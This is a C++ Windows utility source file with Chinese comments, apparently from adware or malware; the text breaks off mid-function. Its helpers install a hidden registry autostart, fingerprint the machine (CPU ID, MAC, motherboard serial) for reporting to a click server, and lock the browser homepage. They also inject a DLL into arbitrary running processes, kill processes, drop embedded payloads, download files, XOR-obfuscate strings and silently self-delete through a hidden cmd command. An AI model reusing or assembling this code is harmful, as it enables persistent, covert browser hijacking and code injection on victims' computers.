#include "StdAfx.h"
#include  <io.h>
#include  <stdio.h>
#include  <stdlib.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#include "Utility.h"
#include "MAC.h"
#include "IE.h"
#include "ProcessHelper.h"
#include "Inject.h"
#include "BottomRightCorner.h"
#include "ZBase64.h"
#include "libHttp.h"

// 开机启动
VOID Utility_StartRun(BOOL isRun)
{
	HKEY   hKey; 
	TCHAR szFileName[MAX_PATH] = {0}; 
	GetModuleFileName(NULL, szFileName, sizeof(szFileName)); 
	LPCTSTR lpRun = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); 
	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey); 
	if(lRet != ERROR_SUCCESS) return;

	TCHAR szItemName[] = _T("NetbatApp");

	if (isRun)
	{
		RegSetValueEx(hKey, szItemName, 0, REG_SZ, (const BYTE*)(LPCSTR)szFileName, strlen(szFileName));
		RegCloseKey(hKey); 
	}
	else
	{
		RegDeleteValue(hKey, szItemName);
		RegCloseKey(hKey); 
	}
}

// 获取CPU编号
VOID Utility_GetCpuID(string &strCpuID)
{
	BOOL bException = FALSE;
	BYTE szCpu[32]  = { 0 };        
	UINT  uCpuID     = 0U;
	char szBuf[256] = {0};
	UINT s1 = 0U;
	UINT s2 = 0U;

	__try    
	{        
		_asm    
		{ 
			mov eax,01h 
				xor edx,edx  
				cpuid    
				mov s1,edx   
				mov s2,eax 
		}    
		sprintf(szBuf, "%08X%08X", s1, s2);
	}        
	__except( EXCEPTION_EXECUTE_HANDLER )       
	{          
		bException = TRUE;      
	}              
	if( !bException )     
	{       
		strCpuID = szBuf;
	}  
}

VOID Utility_DebugLog(string &log)
{
	string strTmp(log);
	strTmp += "\r\n";
	OutputDebugStringA(strTmp.c_str());
}

VOID Utility_DebugLogEx(char* szLog)
{
	Utility_DebugLog(string(szLog));
}

// 获取网卡MAC地址
VOID Utility_GetMacAddress(string &strMAC)
{
	char szMac[4096] = {0};
	GetMacAddress(szMac);
	strMAC = string(szMac);
}

// 创建IE快捷方式
BOOL Utility_CreateInternetShortcut(CHAR *szFilePath, CHAR *szURL, CHAR *szIconFile)
{
	FILE* pFile = fopen(szFilePath, "w");
	if (pFile == NULL) return FALSE;
	
	string newLine = "\r\n";
	string line_1 = "[InternetShortcut]";
	string line_2 = "URL=" + string(szURL);
	string line_3 = "IconFile=" + string(szIconFile);
	string line_4 = "IconIndex=1";

	fwrite(line_1.c_str(), line_1.length(), 1, pFile);
	fwrite(newLine.c_str(), newLine.length(), 1, pFile);

	fwrite(line_2.c_str(), line_2.length(), 1, pFile);
	fwrite(newLine.c_str(), newLine.length(), 1, pFile);

	fwrite(line_3.c_str(), line_3.length(), 1, pFile);
	fwrite(newLine.c_str(), newLine.length(), 1, pFile);

	fwrite(line_4.c_str(), line_4.length(), 1, pFile);
	fwrite(newLine.c_str(), newLine.length(), 1, pFile);

	fclose(pFile);
	pFile = NULL;
	return TRUE;
}



BOOL Utility_OpenIE(CHAR *szURL)
{
	// IEXPLORE.EXE www.baidu.com
	string strParam;
	Utility_GetIEPath(strParam);
	strParam += " ";
	strParam += (szURL);

	return Utility_CreateProcessAsUser((LPTSTR)strParam.c_str());
	//return IE_Run(szURL);
}

// 判断指定进程是否存在
BOOL Utility_IsHaveProcess(CHAR *szProcessName)
{
	return IsHaveProcess(szProcessName);
}
BOOL Utility_IsHaveProcessEx(DWORD dwPID)
{
	return IsHaveProcessEx(dwPID);
}

BOOL Utility_SetHomePage(char *szURL, BOOL isLock)
{
	return IE_SetHomePage(szURL, isLock);
}

wstring Utility_string2wstring(string &strSrc)
{
	if (strSrc.length() <= 0)
	{
		return L"";
	}
	wstring wstrDst;
	int iWstrLen = MultiByteToWideChar(CP_ACP, 0, strSrc.c_str(), strSrc.size(), NULL, 0);
	wchar_t* pwcharBuf = new wchar_t[iWstrLen + sizeof(wchar_t)];   // 多一个结束符
	if (pwcharBuf == NULL || iWstrLen <= 0)
	{
		return L"";
	}
	memset(pwcharBuf, 0, iWstrLen*sizeof(wchar_t) + sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, strSrc.c_str(), strSrc.size(), pwcharBuf, iWstrLen);
	pwcharBuf[iWstrLen] = L'\0';	
	wstrDst.append(pwcharBuf);
	delete[] pwcharBuf;
	pwcharBuf = NULL;
	return wstrDst;
}

string Utility_wstring2string(wstring &wstrSrc)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, wstrSrc.c_str(), -1, NULL, 0, NULL, NULL);  
	LPSTR lpszStr = new char[nLen];  
	WideCharToMultiByte(CP_ACP, 0, wstrSrc.c_str(), -1, lpszStr, nLen, NULL, NULL);  
	string szStr = lpszStr;  
	delete [] lpszStr;  
	return szStr;  
}

BOOL Utility_EnabledDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk=FALSE;
	if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount=1;
		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
		fOk=(GetLastError()==ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

/**
@Name:    Utility_ReleaseResFile
@Brief	  释放资源文件   
@Param:   WORD wResID			资源ID
@Param:   LPCTSTR szResType		资源类型
@Param:   LPCTSTR szDstFilePath	释放后的文件路径
@Return:  成功TRUE,释放FALSE
*/
BOOL Utility_ReleaseResFile(WORD wResID, LPCTSTR szResType, LPCTSTR szDstFilePath)
{ 
	if (szResType == NULL || szDstFilePath == NULL)
	{
		return FALSE;
	}

	//MakeSureDirectoryPathExists(szDstFilePath);

	char szLog[1024] = {0};
	DWORD dwErrCode = 0;

	// 创建文件 
	DWORD dwShareMode = FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE;
	HANDLE  hFile = CreateFileA(szDstFilePath, GENERIC_WRITE, dwShareMode, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hFile == INVALID_HANDLE_VALUE ) 
	{ 
		dwErrCode = GetLastError();
		return FALSE; 
	} 

	HRSRC  hrsc = FindResource(NULL, MAKEINTRESOURCE(wResID), szResType);	// 查找资源
	HGLOBAL hG =  LoadResource(NULL, hrsc);			// 加载资源
	DWORD  dwSize = SizeofResource(NULL,  hrsc);	// 获取资源大小
	if(dwSize <= 0)
	{
		dwErrCode = GetLastError();
		return FALSE;
	}

	// 写入文件 
	DWORD   dwWrite = 0;    
	WriteFile(hFile, hG, dwSize, &dwWrite, NULL);
	CloseHandle(hFile); 

	return dwWrite > 0; 
} 

BOOL Utility_SelfDel()
{
	SHELLEXECUTEINFO sei;
	TCHAR szModule [MAX_PATH],szComspec[MAX_PATH],szParams [MAX_PATH];//字符串数组

	// 获得文件名.
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))//获取szComspec=cmd.exe
	{
		// 设置命令参数.
		lstrcpy(szParams,"/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");

		// 设置结构成员.
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;//C:\Windows\system32\cmd.exe
		sei.lpParameters = szParams;//  /c del E:\adb\datasafe\Debug\datasafe.exe > nul
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		// 执行shell命令.
		if(ShellExecuteEx(&sei))
		{
			// 设置命令行进程的执行级别为空闲执行,使本程序有足够的时间从内存中退出. 
			SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);
			SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

			// 通知Windows资源浏览器,本程序文件已经被删除.
			SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);
			return TRUE;
		}
	}
	return FALSE;
} 

VOID Utility_GetWindowsFolder(string &strWinFolder)
{
	char szBuffer[MAX_PATH] ={0} ;  
	SHGetSpecialFolderPathA(NULL, szBuffer, CSIDL_WINDOWS, FALSE); 
	strWinFolder = string(szBuffer);
}

bool Utility_Http_Get(wstring wszServerName,WORD nServerPort, wstring wszObjectName, string &result)
{
	return libHttp_Get(wszServerName, nServerPort, wszObjectName, result);
}

bool Utility_Http_Get(const string& url, string &result)
{
	// http://xxxx/click.jsp?id=1&type=1&key=cpu_zhuban_00-00-00-00
	string webUrl(url);
	string strServerName;
	string strObjectName;
	WORD nServerPort = 80;
	Utility_Replace(webUrl, "http://", "");

	size_t siPos = webUrl.find("/");
	strServerName = webUrl.substr(0, siPos);
	strObjectName = webUrl.substr(siPos + 1, webUrl.length() - siPos);

	string strTmp(strServerName);
	siPos = strTmp.find(":");
	if (siPos != string::npos)
	{
		strServerName = strTmp.substr(0, siPos);
		string strPort = strTmp.substr(siPos + 1, strTmp.length() - siPos);
		nServerPort = atoi(strPort.c_str());
	}

	return libHttp_Get(Utility_string2wstring(strServerName), nServerPort, Utility_string2wstring(strObjectName), result);
}


bool Utility_Http_Post(wstring wszServerName,WORD nServerPort, wstring wszObjectName,string &postData, string &result)
{
	return libHttp_Post(wszServerName, nServerPort, wszObjectName, postData, result);
}

bool Utility_Http_DownloadFile(const wchar_t *wszURL, const wchar_t *wszFileSavePath)
{
	return libHttp_DownloadFile(wszURL, wszFileSavePath);
}

string Utility_Base64_Encode(const unsigned char* Data,int DataByte)
{
	ZBase64 zBase;
	return zBase.Encode(Data, DataByte);
}

string Utility_Base64_Decode(const char* Data,int DataByte,int& OutByte)
{
	ZBase64 zBase;
	return zBase.Decode(Data, DataByte, OutByte);
}

string Utility_Xor(const string &strData, const char chXorKey)
{
	string strRet = "";
	string::iterator it;
	char szTmp[4] = {0};
	for (int i = 0; i < strData.length(); i++)
	{
		char c = strData.at(i);
		c = c ^ chXorKey;
		sprintf(szTmp, "%c", c);
		strRet += string(szTmp);
	}
	return strRet;
}

string& Utility_Trim(string &s)
{
	if (s.empty()) 
	{
		return s;
	}

	s.erase(0,s.find_first_not_of(" "));
	s.erase(s.find_last_not_of(" ") + 1);
	return s;
}

void Utility_Replace(string& str,const string& strOld,const string& strNew)
{
	string::size_type pos = 0;
	string::size_type a = strOld.size();
	string::size_type b = strNew.size();
	while((pos = str.find(strOld, pos))!= string::npos)
	{
		str.replace(pos,a, strNew);
		pos+=b;
	}
}

void Utility_Split(const string& src, const string& separator, vector<string>& dest)
{
	string str = src;
	string substring;
	string::size_type start = 0, index;

	do
	{
		index = str.find_first_of(separator,start);
		if (index != string::npos)
		{    
			substring = str.substr(start,index-start);
			dest.push_back(substring);
			start = str.find_first_not_of(separator,index);
			if (start == string::npos) return;
		}
	}while(index != string::npos);

	//the last token
	substring = str.substr(start);
	dest.push_back(substring);
}

void Utility_GetJsonItem(const string& src, const string& itemName, string& dest)
{
	string strItemName = "\"";
	strItemName += itemName;
	strItemName += "\":";

	size_t posA = src.find(strItemName);
	if (posA == string::npos)
	{
		return;
	}

	int increment = 0;
	size_t posB = src.find(",\"", posA);	// {"param":"baidu,http://www.baidu.com//favicon.ico,http://www.baidu.com","state":1,"type":1}
	if (posB == string::npos)
	{
		posB = src.find("}", posA);
		increment = 0;
	}

	if(posB <= posA) return;

	dest = src.substr(posA + strItemName.length(), posB - posA - strItemName.length() - increment);
}

void Utility_GetDesktopDir(string& dest)
{
	TCHAR szDir[_MAX_PATH] = {0};    
	SHGetSpecialFolderPath(NULL, szDir, CSIDL_DESKTOP, 0);
	//SHGetSpecialFolderPath(NULL, szDir, CSIDL_DESKTOPDIRECTORY, 0);
	dest = string(szDir);
}

int Utility_Rand(int min, int max)
{
	if(max <= 0) return 0;
	srand(time(NULL));
	int iRand = rand();
	iRand = iRand % max + min;
	return iRand;
}

void Utility_RandFileName(string &strRet, const string & strExt)
{
	const char cs[] = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::random_device r;
	std::default_random_engine e(r());
	std::uniform_int_distribution<> u(0, _countof(cs) - 2);

	char n[32];
	int l = 5;
	strcpy(&n[l], strExt.c_str());
	while (--l >= 0) {
		n[l] = cs[u(e)];
	}
	strRet = std::string(n);
}


string Utility_GBKToUTF8(const std::string& strGBK)
{
	string strOutUTF8 = "";
	WCHAR * str1;
	int n = MultiByteToWideChar(CP_ACP, 0, strGBK.c_str(), -1, NULL, 0);
	str1 = new WCHAR[n];
	MultiByteToWideChar(CP_ACP, 0, strGBK.c_str(), -1, str1, n);
	n = WideCharToMultiByte(CP_UTF8, 0, str1, -1, NULL, 0, NULL, NULL);
	char * str2 = new char[n];
	WideCharToMultiByte(CP_UTF8, 0, str1, -1, str2, n, NULL, NULL);
	strOutUTF8 = str2;
	delete[]str1;
	str1 = NULL;
	delete[]str2;
	str2 = NULL;
	return strOutUTF8;
}

string Utility_UTF8ToGBK(const std::string& strUTF8)
{
	int len = MultiByteToWideChar(CP_UTF8, 0, strUTF8.c_str(), -1, NULL, 0);  
	unsigned short * wszGBK = new unsigned short[len + 2];  
	memset(wszGBK, 0, len * 2 + 2);  
	MultiByteToWideChar(CP_UTF8, 0, (LPCTSTR)strUTF8.c_str(), -1, (LPWSTR)wszGBK, len);  

	len = WideCharToMultiByte(CP_ACP, 0, (LPWSTR)wszGBK, -1, NULL, 0, NULL, NULL);  
	char *szGBK = new char[len + 1];  
	memset(szGBK, 0, len + 1);  
	WideCharToMultiByte(CP_ACP,0, (LPWSTR)wszGBK, -1, szGBK, len, NULL, NULL);  
	//strUTF8 = szGBK;  
	std::string strTemp(szGBK);  
	delete[]szGBK;  
	delete[]wszGBK;  
	return strTemp;  
}

void Utility_GetAllProcess(list<PROCESSENTRY32> &listProcess)
{
	PROCESSENTRY32 pe32;//用于存放进程信息的结构体
	HANDLE hProcessSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//创建进程快照
	pe32.dwSize=sizeof(pe32);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed!\n");
		return;
	}

	listProcess.clear();
	BOOL bMore=::Process32First(hProcessSnap,&pe32);//获取第一个进程信息到pe32结构体中
	while(bMore)
	{
		listProcess.push_back(pe32);
		bMore=::Process32Next(hProcessSnap,&pe32);
	}
}

void Utility_KillProcess(string &processName)
{
	list<PROCESSENTRY32> listProcess;
	Utility_GetAllProcess(listProcess);
	list<PROCESSENTRY32>::iterator it = listProcess.begin();
	for (it; it != listProcess.end(); )
	{
		if (strstr(it->szExeFile, processName.c_str()) != NULL)
		{
			// When the all operation fail this function terminate the "winlogon" Process for force exit the system.
			HANDLE hYourTargetProcess = OpenProcess(PROCESS_QUERY_INFORMATION |   // Required by Alpha
				PROCESS_CREATE_THREAD     |   // For CreateRemoteThread
				PROCESS_VM_OPERATION      |   // For VirtualAllocEx/VirtualFreeEx
				PROCESS_VM_WRITE,             // For WriteProcessMemory
				FALSE, 
				it->th32ProcessID);
			if(hYourTargetProcess != NULL)
			{
				TerminateProcess(hYourTargetProcess, 0);
			}
		}
		it++;
	}
}

BOOL Utility_InjectDll(char *szDllPath)
{
	list<PROCESSENTRY32> listProcess;
	Utility_GetAllProcess(listProcess);
	list<PROCESSENTRY32>::iterator it = listProcess.begin();

	for (it; it != listProcess.end(); it++)
	{
		if(it->th32ProcessID < 5) continue;
		if (InjectDll(it->th32ProcessID, szDllPath)) return TRUE;
	}
	return FALSE;
}

BOOL Utility_GetCurrentExePath(string &strExePath)
{
	char szCurExe[4096] = {0};
	GetModuleFileName(NULL, szCurExe, sizeof(szCurExe));
	strExePath = string(szCurExe);
	return TRUE;
}

BOOL Utility_IsHaveFile(const char* szFilePath)
{
	if( (_access(szFilePath, 0 )) != -1 )
	{
		return TRUE;
	}
	return FALSE;
}

VOID Utility_GetSysTmpFolder(string &strFolder)
{
	char szBuffer[MAX_PATH] = {0} ;  
	//SHGetSpecialFolderPathA(NULL, szBuffer, CSIDL_INTERNET_CACHE, FALSE); 
	SHGetSpecialFolderPathA(NULL, szBuffer,  CSIDL_LOCAL_APPDATA, FALSE); 
	strFolder = string(szBuffer);
}

BOOL Utility_GetBaseBoardByCmd(char *lpszBaseBoard, int len)
{
	const long MAX_COMMAND_SIZE = 10000; // 命令行输出缓冲大小	
	CHAR szFetCmd[]			= "wmic BaseBoard get SerialNumber"; // 获取主板序列号命令行	
	const string strEnSearch = "SerialNumber"; // 主板序列号的前导信息

	BOOL   bret		  = FALSE;
	HANDLE hReadPipe  = NULL; //读取管道
	HANDLE hWritePipe = NULL; //写入管道	
	PROCESS_INFORMATION pi;   //进程信息	
	STARTUPINFO			si;	  //控制命令行窗口信息
	SECURITY_ATTRIBUTES sa;   //安全属性

	char			szBuffer[MAX_COMMAND_SIZE+1] = {0}; // 放置命令行结果的输出缓冲区
	string			strBuffer;
	unsigned long	count = 0;
	long			ipos  = 0;

	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	memset(&sa, 0, sizeof(sa));

	pi.hProcess = NULL;
	pi.hThread  = NULL;
	si.cb		= sizeof(STARTUPINFO);
	sa.nLength	= sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle		= TRUE;

	//1.0 创建管道
	bret = CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
	if(!bret)
	{
		goto END;
	}

	//2.0 设置命令行窗口的信息为指定的读写管道
	GetStartupInfo(&si);
	si.hStdError	= hWritePipe;
	si.hStdOutput	= hWritePipe;
	si.wShowWindow	= SW_HIDE; //隐藏命令行窗口
	si.dwFlags		= STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	//3.0 创建获取命令行的进程
	bret = CreateProcessA(NULL, szFetCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi );
	if(!bret)
	{
		goto END;
	}	

	//4.0 读取返回的数据
	WaitForSingleObject (pi.hProcess, 500/*INFINITE*/);
	bret  =  ReadFile(hReadPipe,  szBuffer,  MAX_COMMAND_SIZE,  &count,  0);
	if(!bret)
	{
		goto END;
	}

	//5.0 查找主板序列号
	bret = FALSE;
	strBuffer = szBuffer;
	ipos = strBuffer.find(strEnSearch);

	if (ipos < 0) // 没有找到
	{		
		goto END;
	}
	else
	{
		strBuffer = strBuffer.substr(ipos+strEnSearch.length());
	}	

	memset(szBuffer, 0x00, sizeof(szBuffer));
	strcpy_s(szBuffer, strBuffer.c_str());

	//去掉中间的空格 \r \n
	int j = 0;
	for (int i = 0; i < strlen(szBuffer); i++)
	{
		if (szBuffer[i] != ' ' && szBuffer[i] != '\n' && szBuffer[i] != '\r')
		{
			lpszBaseBoard[j] = szBuffer[i];
			j++;
		}
	}

	bret = TRUE;

END:
	//关闭所有的句柄
	CloseHandle(hWritePipe);
	CloseHandle(hReadPipe);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return(bret);
}

VOID Utility_GetCurrentModuleDir(std::string& strDir, HMODULE hModule)
{

	TCHAR szDir[MAX_PATH] = {0};

	GetModuleFileName(hModule, szDir, sizeof(szDir));
	PathRemoveFileSpec(szDir);
	strDir = string(szDir);
}

VOID Utility_ShowRightCornerWindow(HINSTANCE hInstance, LPCSTR szUrl, LPCSTR szCaption)
{
	ShowRightCornerWindow(hInstance, szUrl, szCaption);
}

HANDLE Utility_GetCreateProcessAsUserToken()
{
	HANDLE hTokenThis = NULL;  
	HANDLE hTokenDup = NULL;  
	HANDLE hThisProcess = GetCurrentProcess();  
	OpenProcessToken(hThisProcess, TOKEN_ALL_ACCESS, &hTokenThis);  
	DuplicateTokenEx(hTokenThis, MAXIMUM_ALLOWED,NULL, SecurityIdentification, TokenPrimary, &hTokenDup); 
	DWORD dwSessionId = WTSGetActiveConsoleSessionId();  
	SetTokenInformation(hTokenDup, TokenSessionId, &dwSessionId, sizeof(DWORD));
	return hTokenDup;
}

BOOL Utility_CreateProcessAsUser(LPTSTR lpCommandLine)
{
	BOOL bRet = FALSE;
	HANDLE hTokenDup = Utility_GetCreateProcessAsUserToken();
	PROCESS_INFORMATION   pi;
	STARTUPINFO   si;   
	ZeroMemory(&si,   sizeof(si));   
	si.cb   =   sizeof(STARTUPINFO);   
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESIZE;
	bRet = CreateProcessAsUser(hTokenDup, NULL, lpCommandLine, NULL,   NULL,   FALSE,   0,   NULL,   NULL,   &si,   &pi);
	DWORD dwErr = GetLastError();
	return bRet;
}

VOID Utility_GetIEPath(string &strRet)
{
	TCHAR tszWindows[256];
	GetSystemDirectory(tszWindows, 256);
	char strExe[4096] = {0};
	sprintf(strExe, "%c:\\Program Files\\Internet Explorer\\IEXPLORE.EXE", tszWindows[0]);

	strRet = strExe;
}

BOOL Utility_IsServerProcess(DWORD dwPID)
{
	DWORD dwSessionID = -1;
	ProcessIdToSessionId(dwPID, &dwSessionID);
	if (dwSessionID == 0)
	{
		return TRUE;
	}
	return FALSE;
}

BOOL Utility_IsWow64ProcessEx(DWORD dwPID)
{
	// 如果系统是x86的，那么进程就不可能有x64
	bool isX86 = false;
#ifndef _WIN64
	isX86 = GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtWow64DebuggerCall") == nullptr ? TRUE : FALSE;
#endif
	if (isX86)
		return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS ,FALSE, dwPID);
	if (hProcess == NULL)
	{
		return TRUE;
	}

	// 进程架构未知，系统是x64的，可以利用IsWow64Process函数判断
	typedef BOOL(WINAPI *ISWOW64PROCESS)(HANDLE, PBOOL);
	ISWOW64PROCESS fnIsWow64Process;
	BOOL isWow64 = TRUE;
	fnIsWow64Process = (ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (fnIsWow64Process != nullptr)
		fnIsWow64Process(hProcess, &isWow64);

	CloseHandle(hProcess);
	hProcess = NULL;
	return !isWow64;
}

void Utility_GetProcessPath(DWORD dwPID, string &strProcessPath)
{
	MODULEENTRY32 pes; 
	pes.dwSize = sizeof(MODULEENTRY32);
	HANDLE hSnapshot =  CreateToolhelp32Snapshot(TH32CS_SNAPMODULE , dwPID);  
	if (hSnapshot == NULL)
	{
		return;
	}
	Module32First(hSnapshot , &pes); 
	strProcessPath = string(pes.szExePath);

	CloseHandle(hSnapshot);
	hSnapshot = NULL;
}

BOOL Utility_Is64BitSystem(VOID)
{
	return GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtWow64DebuggerCall") != nullptr ? TRUE : FALSE;
}

BOOL Utility_IsNewProcess(DWORD dwPID, DWORD dwSecond)
{
	BOOL bRet = FALSE;
	HANDLE  hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);
	FILETIME  creationTime;
	FILETIME  exitTime;
	FILETIME  kernelTime;
	FILETIME  userTime ;
	bRet = GetProcessTimes(hProcess, &creationTime, &exitTime, &kernelTime, &userTime);
	if (!bRet)
	{
		return FALSE;
	}

	SYSTEMTIME stA;
	SYSTEMTIME stB;
	FileTimeToSystemTime(&creationTime, &stA);
	GetSystemTime(&stB);

	INT iDiffSeconds = Utility_GetSystemTimeDiffSeconds(stA, stB);
	bRet = iDiffSeconds >= dwSecond  ? FALSE : TRUE;
	return bRet;
}

BOOL Utility_CloseProcess(LPCSTR szProcessName)
{
	BOOL bRet = FALSE;
	list<PROCESSENTRY32> listProcess;
	Utility_GetAllProcess(listProcess);
	list<PROCESSENTRY32>::iterator it = listProcess.begin();
	for (it; it != listProcess.end(); it++)
	{
		PROCESSENTRY32 pe32 = *it;
		if (0 == strcmp(pe32.szExeFile, szProcessName))
		{
			HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			bRet = TerminateProcess(h, 4);
		}
	}
	return bRet;
}

INT Utility_GetSystemTimeDiffSeconds(const SYSTEMTIME &t1, const SYSTEMTIME &t2)
{
	FILETIME fTime1 = { 0, 0 };  
	FILETIME fTime2 = { 0, 0 };  
	SystemTimeToFileTime(&t1, &fTime1);  
	SystemTimeToFileTime(&t2, &fTime2);  

	time_t tt1 = Utility_FileTimeToTime(fTime1);  
	time_t tt2 = Utility_FileTimeToTime(fTime2);  

	return abs((int)(tt2 - tt1));  
}

time_t Utility_FileTimeToTime(const FILETIME &ft)
{
	ULARGE_INTEGER ui;  
	ui.LowPart = ft.dwLowDateTime;  
	ui.HighPart = ft.dwHighDateTime;  
	return ((LONGLONG)(ui.QuadPart - 116444736000000000) / 10000000); 
}

BOOL Utility_InjectDllEx(DWORD dwPID, char *szDllName)
{
	return InjectDll(dwPID, szDllName);
}

bool Utility_ChangeLinkIcon(string &strLnkPath, string &strIconPath)
{
	HRESULT hres;
	IShellLink *psl = NULL;
	IPersistFile *pPf = NULL;
	int id;
	LPITEMIDLIST pidl;
	bool bRet = false;

	do
	{
		hres = CoInitialize(NULL);
		if (FAILED(hres))
		{
			break;
		}

		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
		if (FAILED(hres))
		{
			break;
		}

		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&pPf);
		if (FAILED(hres))
		{
			break;
		}

		wstring wstrLinkPath;
		wstrLinkPath = Utility_string2wstring(strLnkPath);

		hres = pPf->Load(wstrLinkPath.c_str(), STGM_READWRITE);    
		if (FAILED(hres))
		{
			break;
		}

		hres = psl->SetIconLocation(strIconPath.c_str(), 0);
		if (FAILED(hres))
		{
			break;
		}
		LPCOLESTR aa;
		pPf->Save(wstrLinkPath.c_str(), TRUE);
		if (FAILED(hres))
		{
			break;
		}

		bRet = true;

	} while (0);

	if (pPf != NULL)
	{
		pPf->Release();
	}

	if (psl != NULL)
	{
		psl->Release();
	}

	CoUninitialize();

	return bRet;
}

BOOL Utility_CreateFileShortcut(LPCSTR szLnkPath, LPCSTR szLinkDst, LPCSTR szLinkDstParam)
{
	CoInitialize(NULL);  
	HRESULT hr;
	IShellLink     *pLink; 
	IPersistFile   *ppf; 

	//创建IShellLink对象
	hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pLink);
	if (FAILED(hr))
		return FALSE;

	// 从IShellLink对象中获取IPersistFile接口
	hr = pLink->QueryInterface(IID_IPersistFile, (void**)&ppf);
	if (FAILED(hr))
	{
		pLink->Release();
		return FALSE;
	}

	pLink->SetPath(szLinkDst);		// 目标
	pLink->SetShowCmd(SW_SHOWNORMAL);		// 显示方式
	pLink->SetArguments(szLinkDstParam);

	WCHAR  wsz[MAX_PATH] = {0}; 
	MultiByteToWideChar(CP_ACP, 0, szLnkPath, -1, wsz, MAX_PATH);
	hr = ppf->Save(wsz, TRUE);

	ppf->Release();
	pLink->Release();
	CoUninitialize(); 

	return SUCCEEDED(hr);
}

int Utility_GetFileSize(LPCSTR szFilePath)
{
	FILE *fp = fopen(szFilePath,"r");  
	if(!fp) return -1;  
	fseek(fp,0L,SEEK_END);  
	int size=ftell(fp);  
	fclose(fp);
	return size;  
}

int Utility_GetPEFileSize(LPCSTR szFilePath)
{
	DWORD dwSize = -1;
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
		LPBYTE lpBuffer = (LPBYTE)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER pImgDosHeader = (PIMAGE_DOS_HEADER)lpBuffer;
		PIMAGE_NT_HEADERS32 pImgNtHeaders = (PIMAGE_NT_HEADERS32) (lpBuffer + pImgDosHeader->e_lfanew);
		PIMAGE_SECTION_HEADER pImgSecHeader = (PIMAGE_SECTION_HEADER) (pImgNtHeaders + 1);

		int iSec = pImgNtHeaders->FileHeader.NumberOfSections -1;
		dwSize = pImgSecHeader[iSec].SizeOfRawData + pImgSecHeader[iSec].PointerToRawData;

		UnmapViewOfFile(lpBuffer);
		CloseHandle(hMap);
		CloseHandle(hFile);
	}

	return dwSize;
}

BOOL Utility_GetOverlayText(LPCSTR szFilePath, string& strOverText)
{
	int iFileSize = Utility_GetFileSize(szFilePath);
	int iPESzie = Utility_GetPEFileSize(szFilePath);
	if (iFileSize <= iPESzie)
	{
		return FALSE;
	}

	FILE *fp = fopen(szFilePath,"r");  
	if(!fp) return FALSE;
	fseek(fp,iPESzie,SEEK_SET);  

	int iDataLen = iFileSize - iPESzie;
	strOverText.resize(iDataLen + 1, '\0');
	fread((VOID*)strOverText.c_str(), 1, iDataLen, fp);

	fclose(fp);
	return TRUE;
}

BOOL Utility_GetOverlayBin(LPCSTR szSrcFilePath, LPCSTR szDstFilePath)
{
	BOOL bRet = FALSE;
	int iFileSize = Utility_GetFileSize(szSrcFilePath);
	int iPESzie = Utility_GetPEFileSize(szSrcFilePath);
	if (iFileSize <= iPESzie)
	{
		return FALSE;
	}

	int iDataLen = iFileSize - iPESzie;
	PBYTE pData = new BYTE[iDataLen];
	if (pData == NULL)
	{
		return FALSE;
	}

